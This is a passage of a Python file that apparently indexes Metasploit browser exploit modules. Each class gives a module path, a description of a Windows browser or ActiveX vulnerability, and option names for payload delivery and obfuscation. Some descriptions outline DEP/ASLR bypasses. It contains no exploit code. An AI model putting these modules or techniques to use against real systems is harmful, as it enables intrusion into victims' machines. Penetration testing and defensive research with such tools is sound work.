        2.1 on Windows XP SP3.
      
		"""

		path = 'windows/browser/ovftool_format_string'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_ms12_037_ie_colspan(object):
		"""
		
          This module exploits a heap overflow vulnerability in Internet Explorer caused
        by an incorrect handling of the span attribute for col elements from a fixed table,
        when they are modified dynamically by javascript code.
      
		"""

		path = 'windows/browser/ms12_037_ie_colspan'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			OBFUSCATE = 'OBFUSCATE'

	class windows_browser_logitechvideocall_start(object):
		"""
		
          This module exploits a stack buffer overflow in the Logitech VideoCall ActiveX
        Control (wcamxmp.dll 2.0.3470.448). By sending a overly long string to the
        "Start()" method, an attacker may be able to execute arbitrary code.
      
		"""

		path = 'windows/browser/logitechvideocall_start'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_ms13_022_silverlight_script_object(object):
		"""
		
        This module exploits a vulnerability in Microsoft Silverlight. The vulnerability exists on
        the Initialize() method from System.Windows.Browser.ScriptObject, which access memory in an
        unsafe manner. Since it is accessible for untrusted code (user controlled) it's possible
        to dereference arbitrary memory which easily leverages to arbitrary code execution. In order
        to bypass DEP/ASLR a second vulnerability is used, in the public WriteableBitmap class
        from System.Windows.dll. This module has been tested successfully on IE6 - IE10, Windows XP
        SP3 / Windows 7 SP1.
      
		"""

		path = 'windows/browser/ms13_022_silverlight_script_object'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			JsObfuscate = 'JsObfuscate'
			JsIdentifiers = 'JsIdentifiers'
			Retries = 'Retries'
			CookieName = 'CookieName'
			CookieExpiration = 'CookieExpiration'
			Custom404 = 'Custom404'

	class windows_browser_ultramjcam_openfiledig_bof(object):
		"""
		
          This module exploits a vulnerability found in TRENDnet SecurView Internet
        Camera's ActiveX control.  By supplying a long string of data as the sFilter
        argument of the OpenFileDlg() function, it is possible to trigger a buffer
        overflow condition due to WideCharToMultiByte (which converts unicode back to)
        overwriting the stack more than it should, which results arbitrary code execution
        under the context of the user.
      
		"""

		path = 'windows/browser/ultramjcam_openfiledig_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_adobe_flashplayer_flash10o(object):
		"""
		
          This module exploits a vulnerability in Adobe Flash Player that was discovered,
        and has been exploited actively in the wild.  By embedding a specially crafted .swf
        file, Adobe Flash crashes due to an invalid use of an object type, which allows
        attackers to overwrite a pointer in memory, and results arbitrary code execution.
        Please note for IE 8 targets, Java Runtime Environment must be available on the
        victim machine in order to work properly.
      
		"""

		path = 'windows/browser/adobe_flashplayer_flash10o'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			OBFUSCATE = 'OBFUSCATE'

	class windows_browser_dxstudio_player_exec(object):
		"""
		
        This module exploits a command execution vulnerability within the DX
        Studio Player from Worldweaver for versions 3.0.29 and earlier. The
        player is a browser plugin for IE (ActiveX) and Firefox (dll). When an
        unsuspecting user visits a web page referring to a specially crafted
        .dxstudio document, an attacker can execute arbitrary commands.

        Testing was conducted using plugin version 3.0.29.0 for Firefox 2.0.0.20
        and IE 6 on Windows XP SP3. In IE, the user will be prompted if they
        wish to allow the plug-in to access local files. This prompt appears to
        occur only once per server host.

        NOTE: This exploit uses additionally dangerous script features to write
        to local files!
      
		"""

		path = 'windows/browser/dxstudio_player_exec'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			CMDSTAGER_FLAVOR = 'CMDSTAGER::FLAVOR'
			CMDSTAGER_DECODER = 'CMDSTAGER::DECODER'

	class windows_browser_ms14_064_ole_code_execution(object):
		"""
		
        This module exploits the Windows OLE Automation array vulnerability, CVE-2014-6332.
        The vulnerability is known to affect Internet Explorer 3.0 until version 11 within
        Windows 95 up to Windows 10, and no patch for Windows XP. However, this exploit will
        only target Windows XP and Windows 7 box due to the Powershell limitation.

        Windows XP by defaults supports VBS, therefore it is used as the attack vector. On other
        newer Windows systems, the exploit will try using Powershell instead.
      
		"""

		path = 'windows/browser/ms14_064_ole_code_execution'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			JsObfuscate = 'JsObfuscate'
			JsIdentifiers = 'JsIdentifiers'
			Retries = 'Retries'
			CookieName = 'CookieName'
			CookieExpiration = 'CookieExpiration'
			Custom404 = 'Custom404'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			required_Powershell_persist = 'Powershell::persist'
			Powershell_prepend_sleep = 'Powershell::prepend_sleep'
			required_Powershell_strip_comments = 'Powershell::strip_comments'
			required_Powershell_strip_whitespace = 'Powershell::strip_whitespace'
			required_Powershell_sub_vars = 'Powershell::sub_vars'
			required_Powershell_sub_funcs = 'Powershell::sub_funcs'
			required_Powershell_exec_in_place = 'Powershell::exec_in_place'
			required_Powershell_encode_final_payload = 'Powershell::encode_final_payload'
			required_Powershell_encode_inner_payload = 'Powershell::encode_inner_payload'
			required_Powershell_use_single_quotes = 'Powershell::use_single_quotes'
			required_Powershell_no_equals = 'Powershell::no_equals'
			required_Powershell_method = 'Powershell::method'
			required_TRYUAC = 'TRYUAC'
			required_AllowPowershellPrompt = 'AllowPowershellPrompt'

	class windows_browser_aventail_epi_activex(object):
		"""
		
          This module exploits a format string vulnerability within version 10.0.4.x and
        10.5.1 of the SonicWALL Aventail SSL-VPN Endpoint Interrogator/Installer ActiveX
        control (epi.dll). By calling the 'AuthCredential' method with a specially
        crafted Unicode format string, an attacker can cause memory corruption and
        execute arbitrary code.

        Unfortunately, it does not appear to be possible to indirectly re-use existing
        stack data for more reliable exploitation. This is due to several particulars
        about this vulnerability. First, the format string must be a Unicode string,
        which uses two bytes per character. Second, the buffer is allocated on the
        stack using the 'alloca' function. As such, each additional format specifier (%x)
        will add four more bytes to the size allocated. This results in the inability to
        move the read pointer outside of the buffer.

        Further testing showed that using specifiers that pop more than four bytes does
        not help. Any number of format specifiers will result in accessing the same value
        within the buffer.

        NOTE: It may be possible to leverage the vulnerability to leak memory contents.
        However, that has not been fully investigated at this time.
      
		"""

		path = 'windows/browser/aventail_epi_activex'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_quickr_qp2_bof(object):
		"""
		
          This module exploits a buffer overflow vulnerability on the UploadControl
        ActiveX. The vulnerability exists in the handling of the "Attachment_Times"
        property, due to the insecure usage of the _swscanf. The affected ActiveX is
        provided by the qp2.dll installed with the IBM Lotus Quickr product.

        This module has been tested successfully on IE6-IE9 on Windows XP, Vista and 7,
        using the qp2.dll 8.1.0.1800. In order to bypass ASLR the no aslr compatible module
        msvcr71.dll is used. This one is installed with the qp2 ActiveX.
      
		"""

		path = 'windows/browser/quickr_qp2_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			OBFUSCATE = 'OBFUSCATE'

	class windows_browser_ie_createobject(object):
		"""
		
          This module exploits a generic code execution vulnerability in Internet
        Explorer by abusing vulnerable ActiveX objects.
      
		"""

		path = 'windows/browser/ie_createobject'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			DynamicSehRecord = 'DynamicSehRecord'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'

	class windows_browser_ie_setmousecapture_uaf(object):
		"""
		
          This module exploits a use-after-free vulnerability that currents targets Internet
          Explorer 9 on Windows 7, but the flaw should exist in versions 6/7/8/9/10/11.
          It was initially found in the wild in Japan, but other regions such as English,
          Chinese, Korean, etc, were targeted as well.

          The vulnerability is due to how the mshtml!CDoc::SetMouseCapture function handles a
          reference during an event. An attacker first can setup two elements, where the second
          is the child of the first, and then setup a onlosecapture event handler for the parent
          element. The onlosecapture event seems to require two setCapture() calls to trigger,
          one for the parent element, one for the child. When the setCapture() call for the child
          element is called, it finally triggers the event, which allows the attacker to cause an
          arbitrary memory release using document.write(), which in particular frees up a 0x54-byte
          memory.  The exact size of this memory may differ based on the version of IE. After the
          free, an invalid reference will still be kept and pass on to more functions, eventuall
          this arrives in function MSHTML!CTreeNode::GetInterface, and causes a crash (or arbitrary
          code execution) when this function attempts to use this reference to call what appears to
          be a PrivateQueryInterface due to the offset (0x00).

          To mimic the same exploit found in the wild, this module will try to use the same DLL
          from Microsoft Office 2007 or 2010 to leverage the attack.
      
		"""

		path = 'windows/browser/ie_setmousecapture_uaf'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			JsObfuscate = 'JsObfuscate'
			JsIdentifiers = 'JsIdentifiers'
			Retries = 'Retries'
			CookieName = 'CookieName'
			CookieExpiration = 'CookieExpiration'
			Custom404 = 'Custom404'

	class windows_browser_mcafeevisualtrace_tracetarget(object):
		"""
		
          This module exploits a stack buffer overflow in the McAfee Visual Trace 3.25 ActiveX
        Control (NeoTraceExplorer.dll 1.0.0.1). By sending a overly long string to the
        "TraceTarget()" method, an attacker may be able to execute arbitrary code.
      
		"""

		path = 'windows/browser/mcafeevisualtrace_tracetarget'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_notes_handler_cmdinject(object):
		"""
		
          This modules exploits a command injection vulnerability in the URL handler for
        for the IBM Lotus Notes Client <= 8.5.3. The registered handler can be abused with
        an specially crafted notes:// URL to execute arbitrary commands with also arbitrary
        arguments. This module has been tested successfully on Windows XP SP3 with IE8,
        Google Chrome 23.0.1271.97 m and IBM Lotus Notes Client 8.5.2.
      
		"""

		path = 'windows/browser/notes_handler_cmdinject'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			FileDropperDelay = 'FileDropperDelay'
			OBFUSCATE = 'OBFUSCATE'

	class windows_browser_oracle_autovue_setmarkupmode(object):
		"""
		
          This module exploits a vulnerability found in the AutoVue.ocx ActiveX control.
        The vulnerability, due to the insecure usage of an strcpy like function in the
        SetMarkupMode method, when handling a specially crafted sMarkup argument, allows
        to trigger a stack based buffer overflow which leads to code execution under the
        context of the user visiting a malicious web page.

        The module has been successfully tested against Oracle AutoVue Desktop Version
        20.0.0 (AutoVue.ocx 20.0.0.7330) on IE 6, 7, 8 and 9 (Java 6 needed to DEP and
        ASLR bypass).
      
		"""

		path = 'windows/browser/oracle_autovue_setmarkupmode'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			DynamicSehRecord = 'DynamicSehRecord'
			OBFUSCATE = 'OBFUSCATE'

	class windows_browser_honeywell_hscremotedeploy_exec(object):
		"""
		
          This module exploits a vulnerability found in the Honeywell HSC Remote Deployer
        ActiveX. This control can be abused by using the LaunchInstaller() function to
        execute an arbitrary HTA from a remote location. This module has been tested
        successfully with the HSC Remote Deployer ActiveX installed with Honeywell EBI
        R410.1.
      
		"""

		path = 'windows/browser/honeywell_hscremotedeploy_exec'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'

	class windows_browser_zenturiprogramchecker_unsafe(object):
		"""
		
          This module allows remote attackers to place arbitrary files on a users file system
        via the Zenturi ProgramChecker sasatl.dll (1.5.0.531) ActiveX Control.
      
		"""

		path = 'windows/browser/zenturiprogramchecker_unsafe'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
